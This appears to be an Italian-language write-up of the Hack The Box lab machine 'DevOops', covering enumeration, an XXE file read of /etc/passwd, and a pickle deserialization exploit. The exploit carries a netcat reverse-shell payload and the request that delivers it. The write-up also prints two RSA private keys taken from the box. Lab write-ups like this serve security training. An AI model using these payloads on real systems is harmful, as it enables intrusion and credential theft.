@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<head>
+  <title> HTB - DevOops </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="generator" content="Org-mode">
+  <meta name="author" content="Leonardo Tamiano">
+
+  <link rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+    integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+    crossorigin="anonymous"/>
+
+  <link rel="stylesheet"
+    href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@5.2/distr/fira_code.css"/>
+
+  <style>
+    body {
+	font-family: 'Fira Code', monospace;
+	font-size: 20px;
+	background-color: #21202C;
+	color: white;
+    }
+
+    h1, h2, h3, h4 {
+	color: #EE72F1;
+	font-weight: bold;
+    }
+
+    .container {
+	margin: auto;
+	width: 70%;
+    }
+
+    .container div#title-div {
+	margin-top: 50px;
+	text-align: center;
+    }
+
+    .container .outline-section {
+	margin-top: 30px;
+	margin-bottom: 30px;
+    }
+
+    footer ul {
+	list-style: none;
+	text-align: center;
+    }
+   </style>
+
+  <script type="text/x-mathjax-config">
+     MathJax.Hub.Config({
+       displayAlign: "center",
+       displayIndent: "2em",
+       messageStyle: "none",
+       "HTML-CSS": {
+          scale: 100,
+          styles: {
+            ".MathJax_Display": {
+            "font-size": "100%"
+          }
+       }
+     },
+     "SVG": {
+       scale: 100,
+       styles: {
+          ".MathJax_SVG_Display": {
+          "font-size": "100%",
+          "margin-left": "-2.281em"
+          }
+       }
+      }
+    });
+  </script>
+  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_SVG"></script>
+</head>
+<body>
+  <div class="container">
+    <div id="title-div">
+       <h1>HTB - DevOops</h1>
+    </div>    <hr/>
+<div id="outline-container-sec-1" class="outline-section">
+<h2> 1 Enumeration </h2>
+<div id="outline-container-sec-1-1" class="outline-section">
+<h3> 1.1 nmap </h3>
+<div id="outline-container-sec-1-1-1" class="outline-section">
+<h4> 1.1.1 nmap -sC -sV devoops </h4>
+<pre class="example">
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-10 21:17 CEST
+Nmap scan report for devoops (10.129.1.79)
+Host is up (0.12s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
+|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
+|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
+5000/tcp open  http    Gunicorn 19.7.1
+|_http-server-header: gunicorn/19.7.1
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.30 seconds
+
+</pre>
+</div>
+<div id="outline-container-sec-1-1-2" class="outline-section">
+<h4> 1.1.2 nmap -p- devoops </h4>
+<pre class="example">
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp    
+</pre>
+</div>
+</div>
+
+<div id="outline-container-sec-1-2" class="outline-section">
+<h3> 1.2 gobuster </h3>
+<div id="outline-container-sec-1-2-1" class="outline-section">
+<h4> 1.2.1 gobuster dir -u <a href="http://devoops:5000">http://devoops:5000</a> -w ~/repos/wordlists </h4>
+<pre class="example">
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://devoops:5000
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/leo/repos/wordlists/dirbuster/directory-list-2.
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              py,txt
+[+] Timeout:                 10s
+===============================================================
+2022/07/10 21:21:59 Starting gobuster in directory enumeration mode
+===============================================================
+/feed                 (Status: 200) [Size: 546263]
+/upload               (Status: 200) [Size: 347]   
+Progress: 5346 / 661683 (0.81%)                  ^C
+[!] Keyboard interrupt detected, terminating.
+                                                  
+===============================================================
+2022/07/10 21:24:13 Finished
+===============================================================
+
+</pre>
+</div>
+</div>
+
+<div id="outline-container-sec-1-3" class="outline-section">
+<h3> 1.3 gunicorn (5000) </h3>
+<div id="outline-container-sec-1-3-1" class="outline-section">
+<h4> 1.3.1 /upload (valid request) </h4>
+<pre class="example">
+POST /upload HTTP/1.1
+Host: devoops:5000
+Content-Length: 322
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://devoops:5000
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbyCHHPcoGSnK7GH
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://devoops:5000/upload
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundaryAbyCHHPcoGSnK7GH
+Content-Disposition: form-data; name="file"; filename="prova.xml"
+Content-Type: text/xml
+
+&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;body&gt;
+&lt;Author&gt; test &lt;/Author&gt;
+&lt;Subject&gt; test &lt;/Subject&gt;
+&lt;Content&gt; test &lt;/Content&gt;
+&lt;/body&gt;
+
+------WebKitFormBoundaryAbyCHHPcoGSnK7GH--    
+</pre>
+
+<p>
+La risposta del server è stata
+</p>
+
+<pre class="example">
+HTTP/1.1 200 OK
+Server: gunicorn/19.7.1
+Date: Sun, 10 Jul 2022 19:29:58 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 157
+
+ PROCESSED BLOGPOST: 
+  Author:  test 
+ Subject:  test 
+ Content:  test 
+ URL for later reference: /uploads/prova.xml
+ File path: /home/roosa/deploy/src    
+</pre>
+
+<p>
+Come possiamo vedere in particolare c'è un path locale
+</p>
+
+<pre class="example">
+    /home/roosa/deploy/src    
+</pre>
+</div>
+<div id="outline-container-sec-1-3-2" class="outline-section">
+<h4> 1.3.2 valid xml format </h4>
+<div class="org-src-container">
+
+<pre class="src src-xml">&lt;?<span style="color: #4f97d7; font-weight: bold;">xml</span>  <span style="color: #9f8766;">version="1.0" encoding="ISO-8859-1"</span>?&gt;
+&lt;<span style="color: #bc6ec5; font-weight: bold;">body</span>&gt;
+&lt;<span style="color: #bc6ec5; font-weight: bold;">Author</span>&gt; test &lt;/<span style="color: #bc6ec5; font-weight: bold;">Author</span>&gt;
+&lt;<span style="color: #bc6ec5; font-weight: bold;">Subject</span>&gt; test &lt;/<span style="color: #bc6ec5; font-weight: bold;">Subject</span>&gt;
+&lt;<span style="color: #bc6ec5; font-weight: bold;">Content</span>&gt; test &lt;/<span style="color: #bc6ec5; font-weight: bold;">Content</span>&gt;
+&lt;/<span style="color: #bc6ec5; font-weight: bold;">body</span>&gt;    
+</pre>
+</div>
+</div>
+
+<div id="outline-container-sec-1-3-3" class="outline-section">
+<h4> 1.3.3 valid xxe payload </h4>
+<p>
+Con questo payload siamo in grado di ottenere una LFI.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-xml">&lt;?<span style="color: #4f97d7; font-weight: bold;">xml</span>  <span style="color: #9f8766;">version="1.0" encoding="ISO-8859-1"</span>?&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;<span style="color: #bc6ec5; font-weight: bold;">body</span>&gt;
+&lt;<span style="color: #bc6ec5; font-weight: bold;">Author</span>&gt; <span style="color: #a45bad;">&amp;</span><span style="color: #a45bad;">ent</span><span style="color: #a45bad;">;</span> &lt;/<span style="color: #bc6ec5; font-weight: bold;">Author</span>&gt;
+&lt;<span style="color: #bc6ec5; font-weight: bold;">Subject</span>&gt; test &lt;/<span style="color: #bc6ec5; font-weight: bold;">Subject</span>&gt;
+&lt;<span style="color: #bc6ec5; font-weight: bold;">Content</span>&gt; test &lt;/<span style="color: #bc6ec5; font-weight: bold;">Content</span>&gt;
+&lt;/<span style="color: #bc6ec5; font-weight: bold;">body</span>&gt;
+</pre>
+</div>
+
+<p>
+The code that processes this XXE is the following one
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">process_xml</span>(filename, path):
+  <span style="color: #7590db;">parser</span> = xml.sax.make_parser()
+  <span style="color: #4f97d7;">object</span> = {}
+  <span style="color: #7590db;">handler</span> = FeedParse(<span style="color: #4f97d7;">object</span>)
+  parser.setContentHandler(handler)
+  parser.parse(<span style="color: #4f97d7;">open</span>(filename))
+<span style="color: #2aa1ae; background-color: #292e34;">#  </span><span style="color: #2aa1ae; background-color: #292e34;">print object</span>
+  <span style="color: #4f97d7; font-weight: bold;">return</span> <span style="color: #2d9574;">" PROCESSED BLOGPOST: \r\n "</span> + \
+         <span style="color: #2d9574;">" Author: "</span> + <span style="color: #4f97d7;">object</span>[<span style="color: #2d9574;">"Author"</span>] + <span style="color: #2d9574;">"\r\n"</span> + \
+         <span style="color: #2d9574;">" Subject: "</span> + <span style="color: #4f97d7;">object</span>[<span style="color: #2d9574;">"Subject"</span>] + <span style="color: #2d9574;">"\r\n"</span> + \
+         <span style="color: #2d9574;">" Content: "</span> + <span style="color: #4f97d7;">object</span>[<span style="color: #2d9574;">"Content"</span>] + <span style="color: #2d9574;">"\r\n"</span> + \
+         <span style="color: #2d9574;">" URL for later reference: "</span> + url_for(<span style="color: #2d9574;">'uploaded_file'</span>,filename=filename) + <span style="color: #2d9574;">"\r\n"</span> + \
+         <span style="color: #2d9574;">" File path: "</span> + path    
+</pre>
+</div>
+</div>
+
+<div id="outline-container-sec-1-3-4" class="outline-section">
+<h4> 1.3.4 feed.py </h4>
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">uploaded_file</span>(filename):
+    <span style="color: #4f97d7; font-weight: bold;">return</span> send_from_directory(Config.UPLOAD_FOLDER, filename)
+
+<span style="color: #ce537a; font-weight: bold;">@app.route</span>(<span style="color: #2d9574;">"/"</span>)
+<span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">xss</span>():
+    <span style="color: #4f97d7; font-weight: bold;">return</span> template(<span style="color: #2d9574;">'index.html'</span>)
+
+<span style="color: #ce537a; font-weight: bold;">@app.route</span>(<span style="color: #2d9574;">"/feed"</span>)
+<span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">fakefeed</span>():
+   <span style="color: #4f97d7; font-weight: bold;">return</span> send_from_directory(<span style="color: #2d9574;">"."</span>,<span style="color: #2d9574;">"devsolita-snapshot.png"</span>)
+
+<span style="color: #ce537a; font-weight: bold;">@app.route</span>(<span style="color: #2d9574;">"/newpost"</span>, methods=[<span style="color: #2d9574;">"POST"</span>])
+<span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">newpost</span>():
+  <span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #ff00ff; font-weight: bold; text-decoration: underline;">TODO</span><span style="color: #2aa1ae; background-color: #292e34;">: proper save to database, this is for testing purposes right now</span>
+  picklestr = base64.urlsafe_b64decode(request.data)
+<span style="color: #2aa1ae; background-color: #292e34;">#  </span><span style="color: #2aa1ae; background-color: #292e34;">return picklestr</span>
+  postObj = pickle.loads(picklestr)
+  <span style="color: #4f97d7; font-weight: bold;">return</span> <span style="color: #2d9574;">"POST RECEIVED: "</span> + postObj[<span style="color: #2d9574;">'Subject'</span>]
+
+
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #ff00ff; font-weight: bold; text-decoration: underline;">TODO</span><span style="color: #2aa1ae; background-color: #292e34;">: VERY important! DISABLED THIS IN PRODUCTION</span>
+<span style="color: #2aa1ae; background-color: #292e34;">#</span><span style="color: #2aa1ae; background-color: #292e34;">app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')</span>
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #ff00ff; font-weight: bold; text-decoration: underline;">TODO</span><span style="color: #2aa1ae; background-color: #292e34;">: Replace run-gunicorn.sh with real Linux service script</span>
+<span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #2aa1ae; background-color: #292e34;">app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')</span>
+
+<span style="color: #4f97d7; font-weight: bold;">if</span> <span style="color: #4f97d7;">__name__</span> == <span style="color: #2d9574;">"__main__"</span>:
+  app.run(host=<span style="color: #2d9574;">'0.0.0,0'</span>, Debug=<span style="color: #a45bad;">True</span>)    
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-3-5" class="outline-section">
+<h4> 1.3.5 exploit pickle </h4>
+<p>
+Nel file <code>feed.py</code> possiamo vedere l'endpoint <code>newpost</code> che in
+particolare chiama la funzione <code>pickle.loads()</code> con un input non
+sanificato su cui abbiamo il controllo.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #ce537a; font-weight: bold;">@app.route</span>(<span style="color: #2d9574;">"/newpost"</span>, methods=[<span style="color: #2d9574;">"POST"</span>])
+<span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">newpost</span>():
+  <span style="color: #2aa1ae; background-color: #292e34;"># </span><span style="color: #ff00ff; font-weight: bold; text-decoration: underline;">TODO</span><span style="color: #2aa1ae; background-color: #292e34;">: proper save to database, this is for testing purposes right now</span>
+  picklestr = base64.urlsafe_b64decode(request.data)
+<span style="color: #2aa1ae; background-color: #292e34;">#  </span><span style="color: #2aa1ae; background-color: #292e34;">return picklestr</span>
+  postObj = pickle.loads(picklestr)
+  <span style="color: #4f97d7; font-weight: bold;">return</span> <span style="color: #2d9574;">"POST RECEIVED: "</span> + postObj[<span style="color: #2d9574;">'Subject'</span>]    
+</pre>
+</div>
+
+<p>
+Per attaccare questa cosa possiamo creare un oggetto python
+malevolo serializzandolo nel seguente modo
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #4f97d7; font-weight: bold;">class</span> <span style="color: #ce537a; font-weight: bold;">exploit</span>(<span style="color: #4f97d7;">object</span>):
+    <span style="color: #4f97d7; font-weight: bold;">def</span> <span style="color: #bc6ec5; font-weight: bold;">__reduce__</span>(<span style="color: #4f97d7; font-weight: bold;">self</span>):
+        <span style="color: #7590db;">payload</span> = <span style="color: #2d9574;">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.53 4321 &gt;/tmp/f"</span>
+        <span style="color: #4f97d7; font-weight: bold;">return</span> (os.system, (payload,))
+        
+<span style="color: #4f97d7;">print</span>(urlsafe_b64encode(pickle.dumps(exploit())))    
+</pre>
+</div>
+
+<p>
+che ritorna
+</p>
+
+<pre class="example">
+Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXwvYmluL25jIDEwLjEwLjE0LjUzIDQzMjEgPi90bXAvZicKcDEKdHAyClJwMwou    
+</pre>
+
+<p>
+A questo punto, inviando la seguente richiesta HTTP siamo in grado
+di ottenere una reverse shell
+</p>
+
+<pre class="example">
+POST /newpost HTTP/1.1
+Host: devoops:5000
+Content-Length: 156
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://devoops:5000
+Content-Type: text
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://devoops:5000/upload
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXwvYmluL25jIDEwLjEwLjE0LjUzIDQzMjEgPi90bXAvZicKcDEKdHAyClJwMwou    
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-2" class="outline-section">
+<h2> 2 PrivEsc </h2>
+<div id="outline-container-sec-2-1" class="outline-section">
+<h3> 2.1 roosa </h3>
+<div id="outline-container-sec-2-1-1" class="outline-section">
+<h4> 2.1.1 id_rsa </h4>
+<p>
+In <code>/home/roosa/.ssh/id_rsa</code> è presente la chiave privata RSA
+dell'utente roosa
+</p>
+
+<pre class="example">
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
+9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
+R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
+v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
+9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
+m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
+JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
+ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
+lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
+koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
+e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
+8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
+Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
+NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
+hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
+ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
+A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
+agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
+KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
+vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
+8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
+y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
+aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
+xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
+82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
+-----END RSA PRIVATE KEY-----
+</pre>
+
+<p>
+Per utilizarla occorre eseguire
+</p>
+
+<pre class="example">
+    chmod 600 id_rsa
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-2-2" class="outline-section">
+<h3> 2.2 root flag </h3>
+<p>
+L'idea era quella di andare nella cartella
+/home/roosa/work/blogfeed e vedere il file <code>.git</code>. Facendo <code>git log</code>
+potevamo vedere i seguenti commit
+</p>
+
+<pre class="example">
+commit 33e87c312c08735a02fa9c796021a4a3023129ad
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 19 09:33:06 2018 -0400
+
+    reverted accidental commit with proper key
+
+commit d387abf63e05c9628a59195cec9311751bdb283f
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 19 09:32:03 2018 -0400
+
+    add key for feed integration from tnerprise backend
+
+commit 1422e5a04d1b52a44e6dc81023420347e257ee5f
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 19 09:24:30 2018 -0400
+
+    Initial commit   
+</pre>
+
+<p>
+Andando indietro al commit
+</p>
+
+<pre class="example">
+   d387abf63e05c9628a59195cec9311751bdb283f
+</pre>
+
+<p>
+con il seguente comando
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">git checkout d387abf63e05c9628a59195cec9311751bdb283f   
+</pre>
+</div>
+
+<p>
+e andando a vedere il file 
+</p>
+
+<pre class="example">
+   /home/roosa/work/blogfeed/resources/integration/authcredentials.key
+</pre>
+
+<p>
+otteniamo la seguente chiave RSA
+</p>
+
+<pre class="example">
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
+nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
+F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
+uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
+gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
+k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
+NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
+HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
+2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
+GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
+jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
+IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
+7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
+Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
+iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
+VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
+S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
+md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
+LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
+oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
+LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
+-----END RSA PRIVATE KEY-----
+   
+</pre>
+
+<p>
+Che è proprio la chiave dell'utente root.
+</p>
+</div>
+</div>
+    <hr/>    <footer>
+      <ul>
+	<li><b>Author</b>: Leonardo Tamiano</li>
+	<li><b>Email</b>: <a href="mailto:leo@archlinux">leo@archlinux</a></li>
+	<li><b>Created</b>: 2022-07-11 lun 04:18</li>
+      </ul>
+</footer>
+</div>
+</body>
+</html>
